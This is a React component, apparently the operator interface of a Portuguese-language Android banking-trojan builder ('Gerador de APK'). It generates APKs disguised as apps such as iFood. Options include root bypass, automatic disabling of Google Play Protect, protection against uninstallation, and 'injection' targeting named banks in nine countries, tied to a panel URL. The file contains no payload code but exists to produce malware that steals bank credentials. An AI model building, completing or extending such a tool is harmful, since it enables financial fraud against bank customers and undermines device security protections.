import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import { Progress } from "@/components/ui/progress";
import { AlertCircle, CheckCircle2, Download, Hammer, Smartphone, Trash2, FolderOpen } from "lucide-react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export function APKBuilder() {
  const [appName, setAppName] = useState("iFood");
  const [appUrl, setAppUrl] = useState("https://www.ifood.com.br/");
  const [logoUrl, setLogoUrl] = useState("");
  const [protectFromUninstall, setProtectFromUninstall] = useState(true);
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState<number>(0);
  
  // Novos campos
  const [bypassRoot, setBypassRoot] = useState(true);
  const [desinstalarPlayProtect, setDesinstalarPlayProtect] = useState(true);
  const [versionName, setVersionName] = useState("1.0.0");
  const [versionCode, setVersionCode] = useState("1");
  const [pais, setPais] = useState("Brasil");
  const [banco, setBanco] = useState("Banco do Brasil");
  const [origemLink, setOrigemLink] = useState("Automatico");
  
  // Injeção de bancos
  const [injetarTodosBancos, setInjetarTodosBancos] = useState(false);

  // Lista de bancos por país
  const bancosPorPais: Record<string, string[]> = {
    "Brasil": ["Banco do Brasil", "Caixa Econômica Federal", "Itaú Unibanco", "Banco Bradesco", "Banco Santander Brasil", "Nubank", "Banco Inter", "C6 Bank", "PicPay", "Banco Safra"],
    "Argentina": ["Banco de la Nación Argentina", "Banco Provincia", "BBVA Argentina", "Banco Santander Argentina", "Banco Galicia"],
    "Chile": ["Banco de Chile", "Banco Santander Chile", "BBVA Chile", "Banco Security", "Banco Estado"],
    "Colômbia": ["Banco de Bogotá", "Banco de Occidente", "BBVA Colombia", "Banco Santander Colombia", "Banco Davivienda"],
    "Espanha": ["Banco Bilbao Vizcaya Argentaria (BBVA)", "Banco Santander", "CaixaBank", "Banco Sabadell"],
    "Estados Unidos": ["Bank of America", "Wells Fargo", "Chase Bank", "Citibank"],
    "França": ["BNP Paribas", "Société Générale", "Crédit Agricole", "Banque de France"],
    "Portugal": ["Caixa Geral de Depósitos", "Banco BPI", "Banco Santander Portugal", "Banco Montepio"],
    "México": ["BBVA México", "Banco Santander México", "Citibanamex", "Scotiabank Inverlat"],
  };

  const bancosPaisAtual = bancosPorPais[pais] || [];

  const buildMutation = trpc.apk.build.useMutation();
  const listQuery = trpc.apk.list.useQuery(undefined, {
    refetchInterval: 2000,
  });
  const clearHistoryMutation = trpc.apk.clearHistory.useMutation();

  const builds = listQuery.data || [];

  const handleBuild = async () => {
    if (!appName.trim()) {
      toast.error("Nome do app é obrigatório");
      return;
    }

    if (!appUrl.trim()) {
      toast.error("URL do app é obrigatória");
      return;
    }

    setIsBuilding(true);
    setBuildProgress(10);

    try {
      await buildMutation.mutateAsync({
        appName,
        appUrl,
        logoUrl,
        protectFromUninstall,
        bypassRoot,
        desinstalarPlayProtect,
        versionName,
        versionCode: parseInt(versionCode),
      });

      toast.success("APK gerado com sucesso!");
      setBuildProgress(100);
      
      setTimeout(() => {
        setIsBuilding(false);
        setBuildProgress(0);
      }, 1000);
    } catch (error) {
      toast.error("Erro ao gerar APK");
      setIsBuilding(false);
      setBuildProgress(0);
    }
  };

  const handleDownload = (downloadUrl: string, appName: string) => {
    const link = document.createElement("a");
    link.href = downloadUrl;
    link.download = `${appName}.apk`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handleClearHistory = async () => {
    if (confirm("Tem certeza que deseja limpar o histórico?")) {
      try {
        await clearHistoryMutation.mutateAsync();
        toast.success("Histórico limpo!");
      } catch (error) {
        toast.error("Erro ao limpar histórico");
      }
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-white mb-2 flex items-center gap-3">
            <Hammer className="w-8 h-8 text-cyan-400" />
            Gerador de APK
          </h1>
          <p className="text-gray-400">Crie APKs customizadas com injeção de bancos</p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
          {/* Coluna de Formulário (2/4) */}
          <div className="lg:col-span-2">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-cyan-400">Configuração do APK</CardTitle>
                <CardDescription>Preencha os dados para gerar sua APK</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* Nome do App */}
                <div>
                  <Label htmlFor="appName" className="text-gray-300 mb-2 block">
                    Nome do App *
                  </Label>
                  <Input
                    id="appName"
                    value={appName}
                    onChange={(e) => setAppName(e.target.value)}
                    placeholder="Ex: iFood, WhatsApp, Instagram"
                    disabled={isBuilding}
                    className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
                  />
                </div>

                {/* URL do App */}
                <div>
                  <Label htmlFor="appUrl" className="text-gray-300 mb-2 block">
                    URL do App *
                  </Label>
                  <Input
                    id="appUrl"
                    value={appUrl}
                    onChange={(e) => setAppUrl(e.target.value)}
                    placeholder="https://www.exemplo.com.br"
                    disabled={isBuilding}
                    className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
                  />
                </div>

                {/* Logo URL */}
                <div>
                  <Label htmlFor="logoUrl" className="text-gray-300 mb-2 block">
                    URL da Logo (Opcional)
                  </Label>
                  <Input
                    id="logoUrl"
                    value={logoUrl}
                    onChange={(e) => setLogoUrl(e.target.value)}
                    placeholder="https://exemplo.com/logo.png"
                    disabled={isBuilding}
                    className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
                  />
                </div>



                {/* Opções Avançadas */}
                <div className="space-y-3 p-4 bg-slate-700/50 rounded border border-slate-600">
                  <p className="text-sm font-semibold text-gray-300">⚙️ Opções Avançadas</p>

                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="bypassRoot"
                      checked={bypassRoot}
                      onCheckedChange={(checked) => setBypassRoot(checked as boolean)}
                      disabled={isBuilding}
                    />
                    <Label htmlFor="bypassRoot" className="text-gray-300 cursor-pointer">
                      ✓ Bypass Root Completo
                    </Label>
                  </div>
                  <p className="text-xs text-gray-500 ml-6">Permite execução em dispositivos com root</p>

                  <div className="flex items-center space-x-2 pt-2">
                    <Checkbox
                      id="desinstalarPlayProtect"
                      checked={desinstalarPlayProtect}
                      onCheckedChange={(checked) => setDesinstalarPlayProtect(checked as boolean)}
                      disabled={isBuilding}
                    />
                    <Label htmlFor="desinstalarPlayProtect" className="text-gray-300 cursor-pointer">
                      ✓ Desinstalar Play Protect Automaticamente
                    </Label>
                  </div>
                  <p className="text-xs text-gray-500 ml-6">Remove proteção do Google Play automaticamente</p>

                  <div className="flex items-center space-x-2 pt-2">
                    <Checkbox
                      id="protect"
                      checked={protectFromUninstall}
                      onCheckedChange={(checked) => setProtectFromUninstall(checked as boolean)}
                      disabled={isBuilding}
                    />
                    <Label htmlFor="protect" className="text-gray-300 cursor-pointer">
                      ✓ Proteção contra desinstalação
                    </Label>
                  </div>
                </div>

                {/* Barra de progresso */}
                {isBuilding && (
                  <div className="space-y-2 pt-4">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-400">Gerando APK...</span>
                      <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
                    </div>
                    <Progress value={Math.min(buildProgress, 100)} className="h-2" />
                  </div>
                )}

                {/* Status de Sucesso */}
                {!isBuilding && builds.length > 0 && builds[0].status === "success" && (
                  <div className="flex items-center gap-2 p-3 bg-green-900/30 border border-green-600 rounded">
                    <CheckCircle2 className="w-5 h-5 text-green-400" />
                    <span className="text-green-300">✓ APK gerado com sucesso!</span>
                  </div>
                )}

                {/* Botão de Gerar */}
                <Button
                  onClick={handleBuild}
                  disabled={isBuilding}
                  className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-semibold py-3 rounded-lg transition-all"
                >
                  {isBuilding ? (
                    <>
                      <div className="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
                      Gerando APK...
                    </>
                  ) : (
                    <>
                      <Download className="w-4 h-4 mr-2" />
                      Build APK
                    </>
                  )}
                </Button>
              </CardContent>
            </Card>
          </div>

          {/* Coluna de Pré-visualização (1/4) */}
          <div className="lg:col-span-1">
            <Card className="bg-slate-800 border-slate-700 sticky top-6">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Smartphone className="w-5 h-5 text-cyan-400" />
                  Pré-visualização
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Logo */}
                <div className="flex justify-center">
                  {logoUrl ? (
                    <img
                      src={logoUrl}
                      alt={appName}
                      className="w-24 h-24 rounded-lg object-cover border-2 border-cyan-400"
                    />
                  ) : (
                    <div className="w-24 h-24 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center text-white text-2xl font-bold">
                      {appName.charAt(0)}
                    </div>
                  )}
                </div>

                {/* Nome do App */}
                <div className="text-center">
                  <p className="text-lg font-semibold text-white">{appName}</p>
                  <p className="text-xs text-gray-400 mt-1">Monitor</p>
                </div>

                {/* Banco */}
                <div className="p-2 bg-slate-700/50 rounded text-center">
                  <p className="text-xs text-gray-400">🏦 Banco</p>
                  <p className="text-sm font-semibold text-cyan-400">{banco}</p>
                </div>

                {/* URL */}
                <div className="p-2 bg-slate-700/50 rounded">
                  <p className="text-xs text-gray-400 mb-1">🔗 URL</p>
                  <p className="text-xs text-gray-300 truncate">{appUrl}</p>
                </div>

                {/* País */}
                <div className="p-2 bg-slate-700/50 rounded text-center">
                  <p className="text-xs text-gray-400">🌍 País</p>
                  <p className="text-sm font-semibold text-cyan-400">{pais}</p>
                </div>

                {/* Customizações */}
                <div className="p-3 bg-slate-700/50 rounded space-y-1 text-xs">
                  <p className="font-semibold text-gray-300 mb-2">Seu APK será customizado com:</p>
                  {logoUrl && <p className="text-gray-400">✓ Logo da empresa</p>}
                  <p className="text-gray-400">✓ Nome customizado</p>
                  <p className="text-gray-400">✓ URL de painel</p>
                  {injetarTodosBancos && <p className="text-cyan-400">✓ Bancos: Todos os bancos ({pais})</p>}
                  {bypassRoot && <p className="text-gray-400">✓ Bypass Root Completo</p>}
                  {desinstalarPlayProtect && <p className="text-gray-400">✓ Desinstalação Automática do Play Protect</p>}
                </div>

                {/* Progresso */}
                {isBuilding && (
                  <div className="space-y-2 pt-4 border-t border-slate-600">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-400">Gerando APK...</span>
                      <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
                    </div>
                    <Progress value={Math.min(buildProgress, 100)} className="h-2" />
                  </div>
                )}
              </CardContent>
            </Card>
          </div>

          {/* Coluna de Downloads (1/4) */}
          <div className="lg:col-span-1">
            <Card className="bg-slate-800 border-slate-700 sticky top-6">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <FolderOpen className="w-5 h-5 text-cyan-400" />
                  Downloads
                </CardTitle>
                <CardDescription>APKs geradas recentemente</CardDescription>
              </CardHeader>
              <CardContent className="space-y-3 max-h-96 overflow-y-auto">
                {builds.length === 0 ? (
                  <p className="text-gray-400 text-sm text-center py-8">Nenhuma APK gerada ainda</p>
                ) : (
                  builds.map((build) => (
                    <div key={build.id} className="p-3 bg-slate-700/50 rounded border border-slate-600 space-y-2">
                      <div className="flex items-start justify-between gap-2">
                        <div className="flex-1 min-w-0">
                          <p className="text-sm font-semibold text-white truncate">{build.appName}</p>
                          <p className="text-xs text-gray-400 truncate">{build.filename}</p>
                          <p className="text-xs text-gray-500 mt-1">
                            {build.fileSize ? `${(build.fileSize / 1024 / 1024).toFixed(2)} MB` : "Calculando..."}
                          </p>
                        </div>
                        {build.status === "success" && (
                          <CheckCircle2 className="w-4 h-4 text-green-400 flex-shrink-0 mt-1" />
                        )}
                      </div>



                      {/* Botão de Download */}
                      {build.status === "success" && build.downloadUrl && (
                        <Button
                          onClick={() => handleDownload(build.downloadUrl, build.appName)}
                          className="w-full bg-green-600 hover:bg-green-700 text-white text-sm py-2 rounded"
                        >
                          <Download className="w-3 h-3 mr-1" />
                          Baixar APK
                        </Button>
                      )}
                    </div>
                  ))
                )}

                {builds.length > 0 && (
                  <Button
                    onClick={handleClearHistory}
                    variant="outline"
                    className="w-full text-red-400 border-red-600 hover:bg-red-900/20"
                  >
                    <Trash2 className="w-3 h-3 mr-2" />
                    Limpar Histórico
                  </Button>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
}
